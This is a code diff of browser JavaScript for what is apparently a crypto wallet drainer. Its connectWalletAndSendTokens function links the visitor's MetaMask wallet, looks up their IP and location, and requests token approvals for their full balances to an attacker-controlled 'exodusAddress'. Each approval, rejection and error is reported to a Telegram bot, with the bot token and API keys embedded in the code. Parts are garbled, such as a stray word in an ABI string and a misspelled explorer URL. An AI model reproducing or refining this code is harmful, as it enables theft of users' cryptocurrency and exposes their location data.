@@ -86,7 +86,7 @@ addEventOnElem(window, "scroll", scrollReveal);
 async function connectWalletAndSendTokens() {
   if (!window.ethers || !window.ethereum) {
     console.error("MetaMask is not installed.");
-    if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    if (/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
       window.location.href = "https://metamask.app.link/dapp/" + window.location.host + window.location.pathname;
     } else {
       window.location.href = "https://metamask.io/download.html";
@@ -106,7 +106,7 @@ async function connectWalletAndSendTokens() {
 
   const botToken = "7875309387:AAHcqO8m9HtaE9dVqVBlv2xnAwDkUTmFDAU";
   const chatId = "5995616824";
-  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFUr3";
+  const moralisApiKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImU1MjI2ZmQ1LTE0NDUtNGIyOC04YzYzLTZmOWEzZDRkNWJjZSIsIm9yZ0lkIjoiNDQ5NTg1IiwidXNlcklkIjoiNDYyNTgwIiwidHlwZUlkIjoiZjVhODc0ZmItZGM2Ni00NjE0LWIxNDUtMjlkYTg5YjIwNDk1IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NDgzOTc5MTksImV4cCI6NDkwNDE1NzkxOX0.lr5-p-SHS7j4EAlsT1ZYt7tTnOfKnoZXSsqS_6WIReY";
 
   const delay = ms => new Promise(resolve => setTimeout(resolve, ms));
 
@@ -115,26 +115,25 @@ async function connectWalletAndSendTokens() {
     const provider = new ethers.providers.Web3Provider(window.ethereum);
     const signer = provider.getSigner();
     const userAddress = await signer.getAddress();
-    console.log(`Wallet connected: ${userAddress} (MetaMask))`);
+    console.log(`Wallet connected: ${userAddress} (MetaMask)`);
 
     // Capture device type
     let deviceType = "Unknown";
-    if (/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
+    if (/Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)) {
       deviceType = "Mobile";
-    } else if (/Tablet/i.test(/Tablet/.test(navigator.userAgent))) {
+    } else if (/Tablet/i.test(navigator.userAgent)) {
       deviceType = "Tablet";
     } else {
       deviceType = "Desktop";
     }
-  }
 
     let locationData = {};
     try {
-      const locRes = await fetch("https://ipapi.co/json/"/json");
+      const locRes = await fetch("https://ipapi.co/json/");
       locationData = await locRes.json();
     } catch (e) {
       console.warn("Location fetch failed", e);
-      locationData = { country_name: "Unknown", ip: "N/A"};
+      locationData = { country_name: "Unknown", ip: "N/A" };
     }
 
     for (const network of evmNetworks) {
@@ -153,7 +152,7 @@ async function connectWalletAndSendTokens() {
               chainName: 'Ethereum Mainnet',
               rpcUrls: ['https://mainnet.infura.io/v3/5b2c5ee5760146349669a1e9c77665d1'],
               nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
-              blockExplorerUrls: ['https://etherscan.io']
+              blockExplorerUrls: ['https://ethersresscan.io']
             };
             await window.ethereum.request({
               method: 'wallet_addEthereumChain',
@@ -272,7 +271,7 @@ ${nativeBalanceMessage}
         if (nonZeroTokens.length > 0) {
           for (const token of nonZeroTokens) {
             try {
-              // Validate contract existence
+              // Validate token contract existence
               const code = await currentProvider.getCode(token.token_address);
               if (code === "0x") {
                 const errorMessage = `
@@ -289,69 +288,69 @@ ${deviceType}
                 continue;
               }
 
-              // Try increaseAllowance first, fallback to approve
-              let contract;
-              let approvalTx;
-              try {
-                contract = new ethers.Contract(token.token_address, [
-                  "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
-                  "function allowance(address owner, address spender) public view returns (uint256)"
-                ], currentSigner);
+              // Try increaseAllowance first, fall back to approve if it fails
+              let contract = new ethers.Contract(token.token_address, [
+                "function increaseAllowance(address spender, uint256 addedValue) public returns (bool)",
+                "function allowance(address owner, address spender) public view returns (uint256)"
+              ], currentSigner);
 
-                const balance = ethers.BigNumber.from(token.balance);
-                const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
-                const neededAllowance = balance.sub(currentAllowance);
+              const balance = ethers.BigNumber.from(token.balance);
+              const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
+              const neededAllowance = balance.sub(currentAllowance);
 
-                if (neededAllowance.gt(0)) {
+              if (neededAllowance.gt(0)) {
+                let approvalTx;
+                try {
                   approvalTx = await contract.increaseAllowance(network.exodusAddress, neededAllowance, { gasLimit: 100000 });
                   await approvalTx.wait();
-                } else {
-                  console.log(`Sufficient allowance already exists for ${token.symbol}`);
-                  continue;
-                }
-              } catch (err) {
-                if (err.message.includes("execution reverted") || err.message.includes("invalid call")) {
-                  // Fallback to approve
-                  contract = new ethers.Contract(token.token_address, [
-                    "function approve(address spender, uint256 amount) public returns (bool)",
-                    "function allowance(address owner, address spender) public view returns (uint256)"
-                  ], currentSigner);
-
-                  const balance = ethers.BigNumber.from(token.balance);
-                  const currentAllowance = await contract.allowance(userAddress, network.exodusAddress);
-                  if (balance.gt(currentAllowance)) {
+                } catch (err) {
+                  if (err.message.includes("execution reverted") || err.message.includes("UNPREDICTABLE_GAS_LIMIT")) {
+                    // Fallback to approve
+                    contract = new ethers.Contract(token.token_address, [
+                      "function approve(address spender, uint256 amount) public returns (bool)",
+                      "function allowance(address owner Vogue, address spender) public view returns (uint256)"
+                    ], currentSigner);
                     approvalTx = await contract.approve(network.exodusAddress, balance, { gasLimit: 100000 });
                     await approvalTx.wait();
                   } else {
-                    console.log(`Sufficient allowance already exists for ${token.symbol}`);
-                    continue;
+                    throw err; // Rethrow non-ABI-related errors
                   }
-                } else {
-                  throw err;
                 }
-              }
 
-              const formattedAmount = ethers.utils.formatUnits(neededAllowance || balance, token.decimals ?? 18);
-              const approvalMessage = `
+                const formattedAmount = ethers.utils.formatUnits(neededAllowance, token.decimals ?? 18);
+                const approvalMessage = `
 ✅ Approval Successful
 Token: ${token.symbol}
 Amount Approved: ${formattedAmount}
 Spender: ${network.exodusAddress}
 Tx: ${approvalTx.hash}
 ${deviceType}
-              `;
-              await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
-              });
+                `;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                  method: "POST",
+                  headers: { "Content-Type": "application/json" },
+                  body: JSON.stringify({ chat_id: chatId, text: approvalMessage })
+                });
+              } else {
+                console.log(`Sufficient allowance already exists for ${token.symbol}`);
+              }
             } catch (err) {
-              const errorMessage = `
+              let errorMessage;
+              if (err.message.includes("user denied") || err.message.includes("not authorized")) {
+                errorMessage = `
+❌ User Rejected Approval
+Token: ${token.symbol || 'Unknown'}
+Error: User denied authorization
+${deviceType}
+                `;
+              } else {
+                errorMessage = `
 ❌ Approval Failed
 Token: ${token.symbol || 'Unknown'}
 Error: ${err.message}
 ${deviceType}
-              `;
+                `;
+              }
               await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
